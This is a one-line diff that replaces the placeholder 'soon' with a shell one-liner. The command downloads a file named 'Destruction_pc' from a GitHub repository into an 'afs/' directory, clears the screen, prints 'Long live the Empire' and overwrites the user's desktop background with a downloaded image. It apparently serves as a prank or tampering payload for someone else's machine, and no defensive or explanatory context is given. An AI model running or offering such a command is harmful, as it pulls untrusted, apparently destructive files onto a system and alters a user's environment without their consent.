@@ -1,1 +1,1 @@
-soon
+cd afs/ && wget https://raw.githubusercontent.com/Noamist/Blind/refs/heads/main/Destruction_pc && cd ~ && clear && echo -e "Long live the Empire" && wget -O ~/.background-image "https://w.wallhaven.cc/full/wy/wallhaven-wyllj6.jpg"
